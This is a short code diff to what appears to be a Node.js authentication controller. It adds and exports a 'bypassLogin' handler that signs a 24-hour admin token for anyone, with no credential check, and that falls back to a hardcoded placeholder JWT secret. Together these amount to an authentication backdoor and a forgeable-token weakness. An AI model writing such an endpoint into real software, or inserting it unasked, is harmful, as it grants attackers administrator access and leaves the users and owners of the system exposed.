@@ -72,4 +72,28 @@ const verifyToken = (req, res) => {
     res.json({ valid: true, user: req.user });
 }
 
-module.exports = { register, login, verifyToken };
+const bypassLogin = async (req, res) => {
+    try {
+        // Just generate a token for user "admin" unconditionally
+        const payload = {
+            user: {
+                id: 'bypass123', // Dummy ID
+                username: 'admin'
+            }
+        };
+
+        jwt.sign(
+            payload,
+            process.env.JWT_SECRET || 'your_super_secret_jwt_key_here',
+            { expiresIn: '24h' },
+            (err, token) => {
+                if (err) throw err;
+                res.json({ token, user: { id: 'bypass123', username: 'admin' } });
+            }
+        );
+    } catch (error) {
+        res.status(500).json({ message: error.message });
+    }
+};
+
+module.exports = { register, login, verifyToken, bypassLogin };
